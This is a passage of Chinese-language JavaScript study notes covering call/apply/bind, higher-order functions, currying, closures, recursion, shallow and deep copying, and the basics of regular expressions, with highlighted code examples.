为我们专门提供了一些函数方法来帮我们更优雅的处理函数内部 this 的指向问题，常用的有 bind()、call()、apply() 三种方法。</p><h3 id="call-方法"><a href="#call-方法" class="headerlink" title="call 方法"></a>call <strong>方法</strong></h3><p>call() 方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的 this 指向。</p><p><code>fun.call(thisArg, arg1, arg2, ...) </code></p><ol><li><p>thisArg：在 fun 函数运行时指定的 this 值</p></li><li><p>arg1，arg2：传递的其他参数</p></li><li><p>返回值就是函数的返回值，因为它就是调用函数</p></li><li><p>因此当我们想改变 this 指向，同时想调用这个函数的时候，可以使用 call，比如继承</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call 的主要作用可以实现继承</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params">uname, age, sex</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.uname = uname;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.sex = sex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params">uname, age, sex</span>) </span>&#123;</span><br><span class="line">    Father.call(<span class="built_in">this</span>, uname, age, sex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">&#x27;刘德华&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son);</span><br></pre></td></tr></table></figure></li></ol><h3 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply 方法"></a><strong>apply</strong> <strong>方法</strong></h3><p>apply() 方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的 this 指向。</p><p><code>fun.apply(thisArg, [argsArray])</code> </p><ol><li><p>thisArg：在fun函数运行时指定的 this 值</p></li><li><p>argsArray：传递的值，必须包含在<strong>数组</strong>里面</p></li><li><p>返回值就是函数的返回值，因为它就是调用函数</p></li><li><p>因此 apply 主要跟数组有关系，比如使用 Math.max() 求数组的最大值</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// apply 的主要应用 比如说我们可以利用 apply 借助于数学内置对象求数组最大值 </span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// var max = Math.max.apply(null, arr); null在严格模式下有问题</span></span><br><span class="line"><span class="keyword">var</span> max = <span class="built_in">Math</span>.max.apply(<span class="built_in">Math</span>, arr);</span><br><span class="line"><span class="keyword">var</span> min = <span class="built_in">Math</span>.min.apply(<span class="built_in">Math</span>, arr);</span><br><span class="line"><span class="built_in">console</span>.log(max, min); <span class="comment">// 99 1</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="bind-方法"><a href="#bind-方法" class="headerlink" title="bind 方法"></a><strong>bind</strong> <strong>方法</strong></h3><p>bind() 方法不会调用函数。但是能改变函数内部this 指向 </p><p><code>fun.bind(thisArg, arg1, arg2, ...) </code></p><ol><li><p>thisArg：在 fun 函数运行时指定的 this 值</p></li><li><p>arg1，arg2：传递的其他参数</p></li><li><p>返回由指定的 this 值和初始化参数改造的<strong>原函数拷贝</strong></p></li><li><p>因此当我们只是想改变 this 指向，并且不想调用这个函数的时候，可以使用 bind</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  如果有的函数我们不需要立即调用,但是又想改变这个函数内部的this指向此时用bind</span></span><br><span class="line"><span class="comment">//  我们有一组按钮,当我们点击了某个按钮之后,就禁用这个按钮,2秒钟之后开启这个按钮</span></span><br><span class="line"><span class="keyword">var</span> btns = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; btns.length; i++) &#123;</span><br><span class="line">    btns[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.disabled = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.disabled = <span class="literal">false</span>;</span><br><span class="line">        &#125;.bind(<span class="built_in">this</span>), <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>下面内容见笔记（一）</p></blockquote></li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">init</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lis.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lis[i].index = i;</span><br><span class="line">        <span class="comment">// 去除了之前 var that = this ，通过 bind 绑定this指向</span></span><br><span class="line">        <span class="built_in">this</span>.lis[i].onclick = <span class="built_in">this</span>.toggleTab.bind(<span class="built_in">this</span>.lis[i],<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.remove[i].onclick = <span class="built_in">this</span>.removeTab.bind(<span class="built_in">this</span>.remove[i],<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// that 形参 即调用时传入的 this 指向，this 指向调用时传入的 this.lis[i] </span></span><br><span class="line"><span class="function"><span class="title">toggleTab</span>(<span class="params">that</span>)</span> &#123;</span><br><span class="line">    that.clearClass();</span><br><span class="line">    <span class="built_in">this</span>.className = <span class="string">&#x27;liactive&#x27;</span>;</span><br><span class="line">    that.sections[<span class="built_in">this</span>.index].className = <span class="string">&#x27;conactive&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p><strong>相同点</strong></p><p>都可以改变函数内部的this指向.</p><p><strong>区别点</strong></p><p>1.call 和 apply 会调用函数, 并且改变函数内部this指向.</p><p>2.call 和 apply 传递的参数不一样, call 传递参数 aru1, aru2..形式 apply 必须数组形式[arg]</p><p>3.bind 不会调用函数, 可以改变函数内部this指向.</p><p><strong>主要应用场景</strong>**</p><p>1.call 经常做继承. </p><p>2.apply 经常跟数组有关系. 比如借助于数学对象实现数组最大值最小值</p><p>3.bind 不调用函数,但是还想改变this指向. 比如改变定时器内部的this指向. </p><hr><h1 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h1><p><strong>高阶函数</strong>是对其他函数进行操作的函数，它接收函数作为参数或将函数作为返回值输出。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">    callback&amp;&amp;callback();</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">&#x27;hi&#x27;</span>)&#125;</span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br></pre></td></tr></table></figure><p>此时fn 就是一个高阶函数。函数也是一种数据类型，同样可以作为参数，传递给另外一个参数使用。 最典型的就是作为回调函数。同理函数也可以作为返回值传递回来。</p><h2 id="函数的柯里化"><a href="#函数的柯里化" class="headerlink" title="函数的柯里化"></a><strong>函数的柯里化</strong></h2><p>通过函数调用继续返回函数的方式，实现多次接收参数最后统一处理的函数编码形式（比如React实现传参的回调函数）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">b</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function">(<span class="params">c</span>)=&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> a+b+c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sum(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a><strong>变量作用域</strong></h2><p>变量根据作用域的不同分为两种：全局变量和局部变量。</p><ol><li> 函数内部可以使用全局变量。</li><li> 函数外部不可以使用局部变量。</li><li> 当函数执行完毕，本作用域内的局部变量会销毁。</li></ol><h2 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a><strong>什么是闭包</strong></h2><p>闭包（closure）指有权访问另一个函数作用域中变量的<strong>函数</strong>。 —– JavaScript 高级程序设计</p><p>简单理解就是 ，一个作用域可以访问另外一个函数内部的局部变量。 </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;    <span class="comment">// fn1 就是闭包函数，闭包就是典型的高阶函数</span></span><br><span class="line">　　　<span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line">　　　<span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　 <span class="built_in">console</span>.log(num); <span class="comment">// 10</span></span><br><span class="line">　　　&#125;</span><br><span class="line">     fn2()</span><br><span class="line">&#125;</span><br><span class="line">fn1();</span><br></pre></td></tr></table></figure><h2 id="在-chrome-中调试闭包"><a href="#在-chrome-中调试闭包" class="headerlink" title="在 chrome 中调试闭包"></a><strong>在 chrome 中</strong>调试闭包</h2><ol><li>打开浏览器，按 F12 键启动 chrome 调试工具。</li><li>设置断点。</li><li>找到 Scope 选项（Scope 作用域的意思）。</li><li>当我们重新刷新页面，会进入断点调试，Scope 里面会有两个参数（global 全局作用域、local 局部作用域）。</li><li>当执行到 fn2() 时，Scope 里面会多一个 Closure 参数 ，这就表明产生了闭包。</li></ol><h2 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a><strong>闭包的作用</strong></h2><p><strong>提问：我们怎么能在 fn() 函数外面访问 fn() 中的局部变量 num 呢 ？</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;　　　　</span><br><span class="line">   <span class="keyword">var</span> num = <span class="number">10</span>;　　　　</span><br><span class="line">   <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> </span>&#123;　　　 <span class="comment">// 返回一个匿名函数</span></span><br><span class="line">        <span class="built_in">console</span>.log(num); <span class="comment">// 10         　　　　</span></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">var</span> f = fn();</span><br><span class="line"> <span class="comment">// 类似于</span></span><br><span class="line"> <span class="comment">// var f = function() &#123;</span></span><br><span class="line"> <span class="comment">//         console.log(num);</span></span><br><span class="line"> <span class="comment">//     &#125;</span></span><br><span class="line"> f() <span class="comment">// 10 调用 f ，得到 fn 内部的变量 num</span></span><br></pre></td></tr></table></figure><h2 id="闭包案例"><a href="#闭包案例" class="headerlink" title="闭包案例"></a><strong>闭包案例</strong></h2><h3 id="循环注册点击事件"><a href="#循环注册点击事件" class="headerlink" title="循环注册点击事件"></a>循环注册点击事件</h3><blockquote><p>存在内存泄漏，所以闭包不一定都有用 （若不点击，i不会销毁）</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用闭包的方式得到当前小li 的索引号</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 利用for循环创建了4个立即执行函数</span></span><br><span class="line">    <span class="comment">// 立即执行函数也成为小闭包因为立即执行函数里面的任何一个函数都可以使用它的i这变量</span></span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// console.log(i);</span></span><br><span class="line">        lis[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环中的-setTimeout"><a href="#循环中的-setTimeout" class="headerlink" title="循环中的 setTimeout()"></a>循环中的 setTimeout()</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 闭包应用--3秒钟之后,打印所有li元素的内容</span></span><br><span class="line"><span class="keyword">var</span> lis = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.nav&#x27;</span>).querySelectorAll(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.length; i++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(lis[i].innerHTML);</span><br><span class="line">        &#125;, <span class="number">3000</span>)</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 思考题 1： 没有产生闭包(未访问函数内变量)</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;The Window&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;My Object&quot;</span>,</span><br><span class="line">    <span class="attr">getNameFunc</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object.getNameFunc()()) <span class="comment">// The Window</span></span><br><span class="line"><span class="comment">// 展开就类似于</span></span><br><span class="line"><span class="keyword">var</span> f = object.getNameFunc();</span><br><span class="line"><span class="comment">// this 在匿名函数里面，指向 window</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line">f()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思考题 2： 产生了闭包</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;The Window&quot;</span>;　　</span><br><span class="line"><span class="keyword">var</span> object = &#123;　　　　</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;My Object&quot;</span>,</span><br><span class="line">    <span class="attr">getNameFunc</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> that.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object.getNameFunc()()) <span class="comment">// My Object</span></span><br></pre></td></tr></table></figure><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><h2 id="什么是递归"><a href="#什么是递归" class="headerlink" title="什么是递归"></a>什么是递归</h2><p>如果一个函数在内部可以调用其本身，那么这个函数就是递归函数。</p><p>由于递归很容易发生“栈溢出”错误（stack overflow），所以必须要加退出条件 <strong>return</strong>。</p><h2 id="利用递归遍历数据"><a href="#利用递归遍历数据" class="headerlink" title="利用递归遍历数据"></a><strong>利用递归遍历数据</strong></h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [&#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;家电&#x27;</span>,</span><br><span class="line">    <span class="attr">goods</span>: [&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="attr">gname</span>: <span class="string">&#x27;冰箱&#x27;</span>,</span><br><span class="line">        <span class="attr">goods</span>: [&#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">111</span>,</span><br><span class="line">            <span class="attr">gname</span>: <span class="string">&#x27;海尔&#x27;</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">112</span>,</span><br><span class="line">            <span class="attr">gname</span>: <span class="string">&#x27;美的&#x27;</span></span><br><span class="line">        &#125;, ]</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">12</span>,</span><br><span class="line">        <span class="attr">gname</span>: <span class="string">&#x27;洗衣机&#x27;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;服饰&#x27;</span></span><br><span class="line">&#125;];</span><br><span class="line"><span class="comment">// 我们想要做输入id号,就可以返回的数据对象</span></span><br><span class="line"><span class="comment">// 1. 利用 forEach 去遍历里面的每一个对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getID</span>(<span class="params">json, id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">    json.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.id == id) &#123;</span><br><span class="line">            o = item;</span><br><span class="line">            <span class="comment">// 2. 我们想要得里层的数据 11 12 可以利用递归函数</span></span><br><span class="line">            <span class="comment">// 里面应该有goods这个数组并且数组的长度不为 0 </span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.goods &amp;&amp; item.goods.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            o = getID(item.goods, id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="浅拷贝和深拷贝"><a href="#浅拷贝和深拷贝" class="headerlink" title="浅拷贝和深拷贝"></a><strong>浅拷贝和深拷贝</strong></h2><ol><li><p>浅拷贝只是拷贝一层, 更深层次对象级别的只拷贝引用.</p></li><li><p>深拷贝拷贝多层, 每一级别的数据都会拷贝.</p></li><li><p>Object.assign(<em>target</em>, …<em>sources</em>)  es6 新增方法可以浅拷贝</p><p><img src="https://i.loli.net/2021/06/07/A5Wr62mhoqZRbnp.jpg" alt="Snipaste_2021-06-07_14-33-37.jpg"></p></li></ol><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span>,</span><br><span class="line">    <span class="attr">msg</span>: &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"><span class="comment">// 方法一</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="comment">// k 是属性名   obj[k] 属性值</span></span><br><span class="line">    o[k] = obj[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方法二 ES6</span></span><br><span class="line"><span class="built_in">Object</span>.assign(o, obj);</span><br></pre></td></tr></table></figure><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 深拷贝拷贝多层, 每一级别的数据都会拷贝.</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span>,</span><br><span class="line">    <span class="attr">msg</span>: &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">color</span>: [<span class="string">&#x27;pink&#x27;</span>, <span class="string">&#x27;red&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"><span class="comment">// 封装函数 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepCopy</span>(<span class="params">newobj, oldobj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> oldobj) &#123;</span><br><span class="line">        <span class="comment">// 判断我们的属性值属于那种数据类型</span></span><br><span class="line">        <span class="comment">// 1. 获取属性值  oldobj[k]</span></span><br><span class="line">        <span class="keyword">var</span> item = oldobj[k];</span><br><span class="line">        <span class="comment">// 2. 判断这个值是否是数组</span></span><br><span class="line">        <span class="keyword">if</span> (item <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</span><br><span class="line">            newobj[k] = [];</span><br><span class="line">            deepCopy(newobj[k], item)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item <span class="keyword">instanceof</span> <span class="built_in">Object</span>) &#123;</span><br><span class="line">            <span class="comment">// 3. 判断这个值是否是对象</span></span><br><span class="line">            newobj[k] = &#123;&#125;;</span><br><span class="line">            deepCopy(newobj[k], item)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 4. 属于简单数据类型</span></span><br><span class="line">            newobj[k] = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">deepCopy(o, obj);</span><br></pre></td></tr></table></figure><hr><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p><strong>正则表达式（</strong> Regular Expression <strong>）</strong>是用于匹配字符串中字符组合的模式。在 JavaScript中，正则表达式也是对象。</p><p>正则表通常被用来检索、替换那些符合某个模式（规则）的文本，例如验证表单：用户名表单只能输入英文字母、数字或者下划线， 昵称输入框中可以输入中文**(匹配)<strong>。此外，正则表达式还常用于过滤掉页面内容中的一些敏感词</strong>(替换)<strong>，或从字符串中获取我们想要的特定部分</strong>(提取)**等 。</p><p>其他语言也会使用正则表达式，本阶段我们主要是利用 JavaScript 正则表达式完成表单验证。</p><h2 id="正则表达式在-JavaScript-中的使用"><a href="#正则表达式在-JavaScript-中的使用" class="headerlink" title="正则表达式在 JavaScript 中的使用"></a><strong>正则表达式</strong>在 <strong>JavaScript</strong> <strong>中的使用</strong></h2><h3 id="创建正则表达式"><a href="#创建正则表达式" class="headerlink" title="创建正则表达式"></a><strong>创建正则表达式</strong></h3><p><strong>1. 通过调用 RegExp 对象的构造函数创建</strong></p><p><code>var 变量名 = new RegExp(/表达式/修饰符); </code></p><p><code>var 变量名 = new RegExp(&#39;表达式&#39;, &#39;修饰符&#39;)</code></p><p><strong>2. 通过字面量创建</strong>（正则表达式不需要加引号，不管是数字型还是字符串型）</p><p><code>var 变量名 = /表达式/修饰符; </code></p><p>// 注释中间放表达式就是正则字面量</p><h3 id="测试正则表达式-test"><a href="#测试正则表达式-test" class="headerlink" title="测试正则表达式 test"></a><strong>测试</strong>正则表达式 <strong>test</strong></h3><p>test() 正则对象方法，用于检测字符串是否符合该规则，该对象会返回 true 或 false，其参数是测试字符串。</p><p> <code>regexObj.test(str)</code></p><ol><li><p>regexObj 是写的正则表达式</p></li><li><p>str 我们要测试的文本，就是检测str文本是否符合我们写的正则表达式规范.</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/123/</span>;</span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/123/g</span>;</span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="number">123</span>));   <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="number">12123</span>));   <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>g：全局模式，查找字符串全部内容，再次匹配时会向前搜索下一个匹配项</p><p>i：不区分大小写</p><p>m：多行模式，表示查找到一行末尾会继续查找</p><p>y：粘附模式，每次调用<code>exec()</code>就只会在lastIndex的位置上寻找匹配字段</p><p>u：Unicode模式</p><p>s：dotAll模式，表示元字符 <code>.</code> 可以匹配任何字符</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&quot;address_address&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> rg = <span class="regexp">/a/g</span>;</span><br><span class="line"><span class="keyword">let</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(a, <span class="string">&quot;g&quot;</span>)  <span class="comment">//在正则中使用变量</span></span><br><span class="line">rg.test(<span class="string">&quot;字符串&quot;</span>);             <span class="comment">//是否包含该字符串，返回布尔值</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">`/a<span class="subst">$&#123;a&#125;</span>/`</span>).test(<span class="string">&quot;字符串&quot;</span>) <span class="comment">//在正则中使用变量 + 其他字符</span></span><br><span class="line">a.match(rg);                  <span class="comment">//返回匹配的字符串 + 具体信息，若正则启用全局模式，则返回一个数组，包含所有匹配的字符串</span></span><br><span class="line">rg.exec(a);                   <span class="comment">//和match差不多，只不过不受全局模式的影响，如果开全局模式，下次再匹配一次，则从lastIndex</span></span><br><span class="line">                              <span class="comment">//开始匹配，在这里也就是从 下标为1的d 开始匹配</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="正则表达式中的特殊字符"><a href="#正则表达式中的特殊字符" class="headerlink" title="正则表达式中的特殊字符"></a><strong><strong>正则表达式</strong></strong>中的特殊字符</h2><h3 id="正则表达式的组成"><a href="#正则表达式的组成" class="headerlink" title="正则表达式的组成"></a><strong>正则表达式的组成</strong></h3><p>一个正则表达式可以由简单的字符构成，比如 /abc/，也可以是简单和特殊字符的组合，比如 /ab*c/ 。其中特殊字符也被称为元字符，在正则表达式中是具有特殊意义的专用符号，如 ^ 、$ 、+ 等。</p><p>正则表达式速查表：<a href="https://www.runoob.com/regexp/regexp-metachar.html">https://www.runoob.com/regexp/regexp-metachar.html</a></p><p>正则表达式在线测试：<a href="https://c.runoob.com/front-end/854">https://c.runoob.com/front-end/854</a></p><h3 id="边界符"><a href="#边界符" class="headerlink" title="边界符"></a><strong>边界符</strong></h3><p>提示字符所处的位置</p><p><img src="https://i.loli.net/2021/06/07/Tzu9xCw2Hbd5GZN.jpg" alt="Snipaste_2021-06-07_15-08-33.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^abc/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;abcd&#x27;</span>));  <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;babc&#x27;</span>));  <span class="comment">//false</span></span><br><span class="line"><span class="comment">//必须是abc,类似全等</span></span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/^abc$/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;abcd&#x27;</span>));  <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;abcabc&#x27;</span>));  <span class="comment">//false</span></span><br></pre></td></tr></table></figure><h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a><strong>字符类</strong></h3><p>**[]**表示有一系列字符可供选择，只要匹配到其中一个就可以了</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/[abc]/</span>;    <span class="comment">//只要包含有a或者b或者c就返回true</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;andy&#x27;</span>));  <span class="comment">//返回true</span></span><br><span class="line"><span class="comment">//var rg = /^[abc]$/ 是三选一，只有是单个a或者b或者c才返回true</span></span><br></pre></td></tr></table></figure><p>[][]<strong>[-]方括号内部范围符</strong>- ：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^[a-z]$/</span>;   <span 